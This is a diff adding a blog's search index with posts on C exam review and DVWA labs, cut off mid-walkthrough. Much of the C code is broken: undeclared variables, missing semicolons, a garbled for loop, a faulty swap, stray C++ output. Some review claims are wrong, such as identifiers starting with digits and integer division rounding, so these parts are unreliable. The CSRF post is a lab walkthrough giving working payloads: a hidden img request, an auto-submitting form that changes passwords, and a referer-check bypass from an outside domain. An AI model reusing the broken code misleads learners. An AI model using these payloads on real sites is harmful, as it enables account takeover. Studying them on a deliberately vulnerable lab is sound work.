@@ -1,0 +1,370 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>C语言期末复习2</title>
+      <link href="/2023/12/04/dayc2/"/>
+      <url>/2023/12/04/dayc2/</url>
+      
+        <content type="html"><![CDATA[<h2 id="C语言常见代码汇总"><a href="#C语言常见代码汇总" class="headerlink" title="C语言常见代码汇总"></a>C语言常见代码汇总</h2><h2 id="判断一个年份是闰年"><a href="#判断一个年份是闰年" class="headerlink" title="判断一个年份是闰年"></a>判断一个年份是闰年</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isleapyear</span><span class="params">(<span class="type">int</span> year)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>)||year%<span class="number">400</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计算两个数的最大公约数（欧几里得算法）"><a href="#计算两个数的最大公约数（欧几里得算法）" class="headerlink" title="计算两个数的最大公约数（欧几里得算法）"></a>计算两个数的最大公约数（欧几里得算法）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> gcd(b,a%b);<span class="comment">//递归计算最大公约数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二进制数转换为十进制数"><a href="#二进制数转换为十进制数" class="headerlink" title="二进制数转换为十进制数"></a>二进制数转换为十进制数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binarytodecimal</span><span class="params">(<span class="type">int</span> binary)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(binary&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> reminder=binary%<span class="number">10</span>;<span class="comment">//获取最后一位数字</span></span><br><span class="line">decimal+=reminder*base;<span class="comment">//将最后一位数字乘以对应权重加到结果中</span></span><br><span class="line">binary/=<span class="number">10</span>;<span class="comment">//去掉最后一位数字</span></span><br><span class="line">base*=<span class="number">2</span>;<span class="comment">//每次权重乘以2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decimal;<span class="comment">//返回对应的十进制数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="斐波那契数列（递归）"><a href="#斐波那契数列（递归）" class="headerlink" title="斐波那契数列（递归）"></a>斐波那契数列（递归）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//斐波那契数列的前两个数是1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fibonacci(n<span class="number">-1</span>)+fibonacci(n<span class="number">-2</span>);<span class="comment">//递归调用计算下一个数字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将一个十进制转化为二进制"><a href="#将一个十进制转化为二进制" class="headerlink" title="将一个十进制转化为二进制"></a>将一个十进制转化为二进制</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decimaltobinary</span><span class="params">(<span class="type">int</span> decimal)</span>&#123;</span><br><span class="line"><span class="type">int</span> innary[<span class="number">32</span>],index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(decimal&gt;<span class="number">0</span>)&#123;</span><br><span class="line">binary[index++]=decimal%<span class="number">2</span></span><br><span class="line">decimal/=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i-=index-);i&gt;=;i--)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d</span></span><br><span class="line"><span class="string">,binary[i];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> c </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> c </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>C语言期末复习1</title>
+      <link href="/2023/12/02/dayc1/"/>
+      <url>/2023/12/02/dayc1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="c语言期末复习辅助"><a href="#c语言期末复习辅助" class="headerlink" title="c语言期末复习辅助"></a>c语言期末复习辅助</h1><h2 id="知识点总复习"><a href="#知识点总复习" class="headerlink" title="知识点总复习"></a>知识点总复习</h2><p>1.程序结构是三种，顺序结构，循环结构，选择结构，</p><p>2.读取程序都需要在main()函数入口，然后从上往下读，直到主函数结束。</p><p>3.计算机中的数据是以二进制的形式保存的，存放的位置就是他的地址，地址是十六进制的</p><p>4.运算符的优先级：单目运算符&gt;双目运算符&gt;三目运算符，算术运算符&gt;关系运算符&gt;逻辑运算符&gt;赋值运算符,逗号运算符的级别最低。</p><h2 id="常见基础知识"><a href="#常见基础知识" class="headerlink" title="常见基础知识"></a>常见基础知识</h2><h3 id="普遍"><a href="#普遍" class="headerlink" title="普遍"></a>普遍</h3><p>1.标识符必须有字母数字下划线组成，并且第一个字符必须为字母或者数字。</p><p>2.不能用main define sacnf等作为标识符</p><p>3.c语言的八进制要以0开头，十六进制要以0x开头。</p><p>4.小数的合法写法：1.0可以写成1 0.1可以写成.1</p><p>5.e前e后必须有数，e后必为整数。</p><p>6.long int x 表示x是长类型 unsignde int x 标识x是无符号类型</p><h3 id="表达式："><a href="#表达式：" class="headerlink" title="表达式："></a>表达式：</h3><p>1.算数表达式：</p><p>”&#x2F;“两边都是整形，那么结果就是一个整数（四舍五入）</p><p>”&#x2F;“如果有一边为小数，那么结果就是小数</p><p>”%“注意是取余数，两边的要求是整数。</p><p>2.赋值表达式</p><p>不能连续赋值</p><p>赋值的左边只能是一个表达式</p><p>3.自加表达式</p><p>++在前先加后用，，++在后先用后加（–类似0</p><p>4.逗号表达式</p><p>优先级别最低</p><p>5.三种取整丢小数的情况</p><p>int a&#x3D;1.6;</p><p>(int)a;</p><p>1&#x2F;2;3&#x2F;2</p><p>6.定义宏常量：#define 标识符 字符串加分号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define PI 3.14159</span><br><span class="line">定义pi</span><br></pre></td></tr></table></figure><p>定义const常量： const 数据类型 标识符字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const int MAX_VALUE = 100;</span><br><span class="line">在这个例子中，MAX_VALUE就是一个const常量，它的数据类型为int，值为100。在程序中可以直接使用MAX_VALUE来代表这个值，而不需要担心其被修改。</span><br></pre></td></tr></table></figure><h3 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h3><h4 id="重要：大写字母和小写字母转换的方法"><a href="#重要：大写字母和小写字母转换的方法" class="headerlink" title="重要：大写字母和小写字母转换的方法"></a>重要：大写字母和小写字母转换的方法</h4><p>‘A’+32&#x3D;’a’ 相互之间一般差32</p><p>转移字符（重要）</p><p>\n换行</p><p>\0空字符</p><p>注：字符型（char)和整数(int)是近亲:有着相似的地方</p><p>char a&#x3D;65</p><p>printf(“%c”,a);得到a</p><p>printf(“%d”,A);得到65</p><h4 id="键盘输入和屏幕输出："><a href="#键盘输入和屏幕输出：" class="headerlink" title="键盘输入和屏幕输出："></a>键盘输入和屏幕输出：</h4><p>getchar()用于字符输入</p><p>putchar（）用于字符输出</p><p>printf（）用于输出数据</p><p>scanf()用于输入数据</p><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><p>1.if（）语句后面不加分号</p><p>2.单支if() 双支if else  多分支if if else() else</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.switch语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">switch()&#123;</span><br><span class="line">case 1:.....;</span><br><span class="line">break</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般需要break使其跳出循环，否则将会按照顺序往下继续进行</p><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><p>1.while</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while()&#123;</span><br><span class="line">......;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.计算循环控制表达式的值;<br>2.如果循环表达式的值为真，那么就执行循环体中的语句，并返回while重新开始判断<br>3.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>2.do-while</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">.....;</span><br><span class="line">&#125;while();</span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1.执行循环体中的语句;<br>2.计算循环控制表达式的值;<br>3.如果循环控制表达式的值为真，那么返回继续执行<br>4.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。</p><p>3.for</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(初始化表达式;循环控制表达试;增值表达式)</span><br><span class="line">&#123;</span><br><span class="line">语句序列</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.注意：使用合适的循环结构，①如果循环次数已知，计数控制的循环，用for语句。②如果循环次数未知，条件控制的循环，用while语句③如果循环体至少要执行一次，用do–while语句。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义并初始化数组"><a href="#定义并初始化数组" class="headerlink" title="定义并初始化数组"></a>定义并初始化数组</h4><p>存放五个字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[5]=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;&#125;;</span><br></pre></td></tr></table></figure><p>存放一个字符：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[5]=&quot;abcd&quot;;</span><br></pre></td></tr></table></figure><p>二维数组初始化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char a[3][4]=&#123;&quot;abc&quot;,&quot;cv&quot;,&quot;rty&quot;&#125;;</span><br></pre></td></tr></table></figure><h4 id="输入字符串"><a href="#输入字符串" class="headerlink" title="输入字符串"></a>输入字符串</h4><p>1.scanf(“%s”,字符串名称)；</p><p>scanf(“%s%s%s”,s1,s2,s3);</p><p>2.get</p><p>get(字符串名称);</p><p>只能输入一个字符串，从光标开始到换行符，也就是说读入的是一整行。例如输入Hello World！获取的是Hello World!</p><h4 id="输出字符串"><a href="#输出字符串" class="headerlink" title="输出字符串"></a>输出字符串</h4><p>1.printf(“%s”,字符串名称)；</p><p>输出项只能是字符串的名称，不能是数组元素。输出字符串不包括字符串结束标识符\0</p><p>2.put</p><p>puts(字符串名称)；</p><p>puts输出一个字符串和一个换行符</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数，函数对形参做处理，结果以return语句形式返回。对函数定义时要加函数类型和实参类型，但函数调用时实参不带类型。</p><h2 id="补充：常见内容的运用"><a href="#补充：常见内容的运用" class="headerlink" title="补充：常见内容的运用"></a>补充：常见内容的运用</h2><h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,j,temp,n,a[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&gt;a[i])&#123;</span><br><span class="line">temp=a[j];</span><br><span class="line">a[j]=a[i];</span><br><span class="line">a[i]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,j,k,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (a[j]&lt;a[k])&#123;</span><br><span class="line">k=j</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (k!=i)&#123;</span><br><span class="line">temp=a[k];</span><br><span class="line">a[k]=a[i];</span><br><span class="line">a[k]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i,l,temp,a[num];</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;num;i++)&#123;</span><br><span class="line">l=i<span class="number">-1</span>;</span><br><span class="line">temp=a[i];</span><br><span class="line"><span class="keyword">while</span>(l&gt;=<span class="number">0</span>&amp;&amp;a[l]&gt;temp)&#123;</span><br><span class="line">a[l+<span class="number">1</span>]=a[l];</span><br><span class="line">l--;</span><br><span class="line">a[l+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> i,j,temp;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;size<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;size<span class="number">-1</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">tmep=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=arr[j];</span><br><span class="line">arr[j+<span class="number">1</span>]=temp;</span><br><span class="line">count=<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> low,high,a[n],mid,temp;</span><br><span class="line">low=<span class="number">0</span>,high=n<span class="number">-1</span>,mid=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (a[mid]&gt;temp)&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a[mid]&lt;temp)&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[mid]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;not found!&quot;</span>&lt;&lt;<span class="built_in">endl</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> c </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> c </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dvwa FI</title>
+      <link href="/2023/11/30/day77777/"/>
+      <url>/2023/11/30/day77777/</url>
+      
+        <content type="html"><![CDATA[<h1 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion 文件包含"></a>File Inclusion 文件包含</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含漏洞：即File  Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web dvwa </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> dvwa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dvwa CSRF</title>
+      <link href="/2023/11/28/day666/"/>
+      <url>/2023/11/28/day666/</url>
+      
+        <content type="html"><![CDATA[<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF（跨站请求伪造），全称为Cross-site request  forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份像服务器发起请求，从而实现非法攻击（改密）。</p><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">//获取两个输入框的密码</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">//查看两次输入的是否一致</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">//如果一致就直接插入数据库</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。</p><p>攻击方式：</p><p>经过上面的尝试发现可以成功修改账号密码，而且我们发现了URL那里的变化，接下来我们从URL处入手再改一下，首先先重置一下数据库，把密码改回来。</p><p>在 C:\phpstudy_pro\WWW 文件夹中建立一个 1.html ，里面写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.3/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>这样的话，当我们打开 1.html 文件的时候，密码就会被修改成123456，（诱骗受害者点击这个1.html文件，放个诱惑链接）</p><p>诱骗链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>但是一般有一些智商的都不会点击，所以可以将长链接转为短链接，可以使用<a href="https://tool.chinaz.com/tools/dwz.aspx%E6%9D%A5%E7%94%9F%E6%88%90%E7%9F%AD%E9%93%BE%E6%8E%A5%E3%80%82">https://tool.chinaz.com/tools/dwz.aspx来生成短链接。</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>或者配合xss一块使用</p><p>新建一个带有xss攻击的hmtl的页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问127.0.0.1&#x2F;xss.hmtl的时候，密码就被修改成了222</p><p>hmtl的核心语句就是通过scirpt标签的src属性来记载攻击的url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False</span><br><span class="line">//判断Host字段是否出现在referer字段中</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line"></span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由上面的代码可知增加了referer判断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false )</span><br></pre></td></tr></table></figure><p>即如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。</p><p>所以我们需要手动伪造referer来执行CSRF攻击</p><p>我们要手动制作一个html表单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过自动触发提交id为csrf的表单</p><p>使用方法：</p><p>1.将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.mengnankk.top/127.0.0.1/csrf.html</span><br></pre></td></tr></table></figure><p>2.或者将上述html文件命名为127.0.0.1html然后访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.mengnankk.top/127.0.0.1.html</span><br></pre></td></tr></table></figure><p>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败。</p><p>3.因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.mengnankk.top/csrf.html?127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="HIGH"><a 